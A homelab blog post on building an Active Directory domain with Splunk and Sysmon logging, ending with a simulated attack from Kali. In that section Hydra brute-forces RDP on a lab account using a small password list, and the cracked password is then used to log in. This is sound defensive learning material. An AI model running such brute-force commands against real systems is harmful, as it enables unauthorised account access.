---
title: Active Directory Homelab Setup
layout: post
date: 2025-10-28
published: true
categories: [homelab, active-directory, splunk]
---

# Active Directory Homelab Setup

This homelab focuses on setting up an Active Directory environment integrated with Splunk for logging and monitoring, utilizing various operating systems to introduce me into the world of Cybersecurity. This also includes me setting up a simulation of a Kali Linux "attack" via RedTeam and Hydra to brute force into a test Windows 11 account.

I'll be using Oracle VirtualBox on my personal Windows 11 machine to host and simulate this LAN because I had difficulties trying to do this on my Optiplex and Inspiron server.

## Table of Contents

1. [Network Topology](#network-topology)
2. [Setting up the VMs](#setting-up-the-vms)
3. [Windows 2025 Server](#1-windows-2025-server)
   - [Installing Splunk Universal Forwarder](#installing-splunk-universal-forwarder-on-windows-server)
   - [Installing Sysmon](#installing-sysmon-for-enhanced-logging)
4. [Windows 11 Pro Target](#2-windows-11-pro)
5. [Kali Attack Machine](#3-kali-attack-machine)
6. [Splunk Ubuntu Server](#4-splunk-ubuntu-server)
7. [Attack Simulation](#5-attack-simulation)
8. [Conclusion](#conclusion)

## Network Topology

![Network Diagram]({{ '/assets/images/active-directory/AD Server.drawio.png' | relative_url }})

## Setting up the VMs

As a pre-note, I configured the VMs with the same amount of CPU cores and memory allocation. 4GB of RAM and 2 CPU cores, 50GB of space is good enough for this lab.

![VirtualBox VM Hardware Config]({{ '/assets/images/active-directory/vbox-config.png' | relative_url }})

## 1: Windows 2025 Server
My first step is to configure the Windows 2025 Server. Microsoft offers a 90 day evaluation of Windows 2025 Server, so I spun up a VM with using the iso file.

After the OS finished installing, I statically set the IP address of the server:

![Windows Server IP Config]({{ '/assets/images/active-directory/windows-server-ip-config.png' | relative_url }})

Then we have to set up AD DS (Active Directory Domain Services) to actually create the **timserver.local** server.

![AD DS Configuration Wizard]({{ '/assets/images/active-directory/ad-ds-config-wizard.png' | relative_url }})

To install and configure Active Directory Domain Services (AD DS) on Windows Server 2025:

1. Open **Server Manager** from the Start menu.

2. Click on **Manage** > **Add Roles and Features**.

3. In the Add Roles and Features Wizard:

   - Select **Role-based or feature-based installation**.

   - Choose the local server.

   - Check the box for **Active Directory Domain Services**.

4. Click **Next** through the features and confirm installation.

5. After installation completes, click on the notification flag in Server Manager and select **Promote this server to a domain controller**.

6. In the Active Directory Domain Services Configuration Wizard:

   - Choose **Add a new forest**.

   - Enter **timserver.local** as the root domain name.

   - Set the Domain and Forest functional levels to **Windows Server 2025** (or the highest available).

   - Specify a Directory Services Restore Mode (DSRM) password.

   - Accept the default NetBIOS domain name or change if needed.

   - Keep the default paths for AD database, log files, and SYSVOL.

7. Review the options and click **Next**.

8. The wizard will check prerequisites; resolve any issues.

9. Click **Install**.

10. The server will automatically restart after the promotion completes.

After the restart, the domain **timserver.local** is created, and you can log in with the domain admin account.

### Installing Splunk Universal Forwarder on Windows Server

To monitor Windows events and forward them to our Splunk server, we need to install Splunk Universal Forwarder on the Windows Server:

1. Download Splunk Universal Forwarder for Windows from the [Splunk website](https://www.splunk.com/en_us/download/universal-forwarder.html).

2. Run the installer and follow the setup wizard.

3. During installation, configure the receiving indexer:
   - **Hostname or IP**: 192.168.10.10
   - **Port**: 9997 (default)

![Splunk Universal Forwarder Setup]({{ '/assets/images/active-directory/splunk-universal-forwarder.png' | relative_url }})

4. Complete the installation and the forwarder will automatically start sending Windows event logs to the Splunk server.

5. Nice! We can access the Splunk web interface at http://192.168.10.10:8000 to view the forwarded logs... once we set up Sysmon,

### Installing Sysmon for Enhanced Logging

To get more detailed system activity monitoring, we'll install Sysmon on both the Windows Server and the Windows 11 target (after it's set up). Here's how to install it:

1. Download Sysmon:
   - Visit the [Microsoft Sysinternals website](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
   - Download Sysmon for Windows

2. Download the open source Sysmon Configuration we'll be using:
   - Go to [Olaf Hartong's GitHub](https://github.com/olafhartong/sysmon-modular)
   - Download the `sysmonconfig.xml` file (click "Raw" then save)

3. Extract Sysmon:
   - Right-click the downloaded Sysmon zip file
   - Select "Extract All"

4. Install Sysmon:
   - Open PowerShell as Administrator
   - Navigate to the extracted Sysmon folder:
     ```powershell
     cd C:\Users\windows\Downloads\Sysmon
     ```
   - Run Sysmon with the configuration:
     ```powershell
     .\Sysmon64.exe -i ..\sysmonconfig.xml
     ```

![Sysmon Installation]({{ '/assets/images/active-directory/sysmon-installation.png' | relative_url }})

The Sysmon logs will automatically be forwarded to Splunk through the Universal Forwarder we installed earlier.

## 2: Windows 11 Pro
The next step is to install our Windows 11 Pro target machine to have it connected to the timserver.local domain. I downloaded the Windows 11 ISO using Microsoft's Media Creation Tool page.

Then, I created a new VM in VirtualBox, linked it to the ISO, configured its memory, CPU, and disk space, and then manually installed Windows 11:

![Windows 11 Config]({{ '/assets/images/active-directory/windows-11-config.png' | relative_url }})

After installing Windows 11, configure a static IP address in the same subnet as the domain controller (e.g., 192.168.10.20/24, gateway 192.168.10.1, DNS 192.168.10.10 for the domain controller).

To join the Windows 11 target machine to the **timserver.local** domain:

1. Right-click on the Start button and select **System**.

2. Click on **Rename this PC (advanced)**.

3. Under "Computer name", click **Change**.

4. Select **Domain** and enter **timserver.local**.

5. Click **OK** and enter the domain administrator credentials (e.g., administrator@timserver.local).

6. Click **OK** to join the domain.

7. Restart the computer when prompted.

Once joined, you can create user accounts in Active Directory Users and Computers on the server for testing.

## 3: Kali Attack Machine
For Kali Linux, I used their [convenient pre-built VirtualBox image](https://www.kali.org/get-kali/#kali-virtual-machines). After downloading the file, I simply imported the .vbox file directly into VirtualBox with the default settings. 

Just a reminder, the default login for Kali is kali for both the username and password.

Set a static IP for Kali in the same subnet, e.g., 192.168.10.30/24.

## 4: Splunk Ubuntu Server
Finally, I prepared the Ubuntu Server, which will host Splunk. I downloaded Ubuntu Server 24.04.3 LTS, as it's the latest version that will support updates for the next 5 years. I created a new VM, and allocated more RAM and disk space (specifically 8GB of ram and 100GB storage), knowing Splunk is a bit more resource-intensive.

![Creating Splunk Server]({{ '/assets/images/active-directory/creating-splunk-server.png' | relative_url }})

I went through the installation, set up a user account, and then performed a system update and upgrade once logged in.

![Installing Splunk]({{ '/assets/images/active-directory/installing-splunk.png' | relative_url }})

Next, I had to statically set the IP to 192.168.10.10/24, so I ran sudo nano /etc/netplan/50-cloud-init.yaml , which stores the network configuration. For DNS, I'll be using Quad9 again, which is 9.9.9.9

![Splunk Netplan Configuration]({{ '/assets/images/active-directory/splunk-netplan-config.png' | relative_url }})

Now, to install Splunk on the Ubuntu Server:

1. Download the Splunk Enterprise tarball from the [Splunk website](https://www.splunk.com/en_us/download/splunk-enterprise.html) (you may need to transfer it to the VM).

2. Extract the tarball: `tar -xzf splunk-*.tgz -C /opt`

3. Start Splunk: `/opt/splunk/bin/splunk start --accept-license`

4. Set the admin password when prompted.

5. Access Splunk web interface at http://192.168.10.10:8000

To integrate with Active Directory for logging, install Splunk Universal Forwarder on the Windows servers.

On the Windows Server and Windows 11 target:

1. Download Splunk Universal Forwarder for Windows.

2. Install it.

3. Configure it to forward logs to the Splunk server: `splunk add forward-server 192.168.10.10:9997`

4. Add data inputs for Windows event logs.

This way, AD events and security logs are sent to Splunk for monitoring.

## 5: Attack Simulation

For the cybersecurity simulation, we'll use Kali Linux to perform a brute force attack on a test user account on the Windows 11 target machine using Hydra.

On the Windows Server:

Let's create a test user in AD with a weak password for demonstration. I'll name him Bob Ross, with his username being **bross**. 

![Creating AD User Bob Ross]({{ '/assets/images/active-directory/creating-ad-user-bob-ross.png' | relative_url }})

On Windows 11 Target:

Enable Remote Desktop: Press Win + R, type `sysdm.cpl`, go to Remote tab, and enable "Allow remote connections".

![RDP Configuration 1]({{ '/assets/images/active-directory/rdp1.png' | relative_url }})

![RDP Configuration 2]({{ '/assets/images/active-directory/rdp2.png' | relative_url }})

On Kali:

1. Update and install Hydra: `sudo apt update && sudo apt install hydra`

2. Create a passwords.txt file with common passwords including Bob Ross's weak password:
   ```bash
   echo -e "password\n123456\nadmin\npassword123\nabc123!" > ~/Desktop/ad-project/passwords.txt
   ```

3. Use Hydra to brute force RDP against the target PC:
   ```bash
   hydra -l bross -P ~/Desktop/ad-project/passwords.txt -t 2 -f rdp://192.168.10.100:3389 -V | tee ~/Desktop/ad-project/hydra-run.log
   ```

![Hydra Brute Force Attack]({{ '/assets/images/active-directory/hydra-rdp-success.png' | relative_url }})

4. Once the password is found, RDP into the target PC:
   ```bash
   xfreerdp /v:192.168.10.100 /u:bross /p:abc123!
   ```

Monitor the attempts in Splunk logs.

This simulates a Red Team attack.

## Conclusion

This homelab setup provides a foundation for learning Active Directory management, logging with Splunk, and basic cybersecurity simulations.
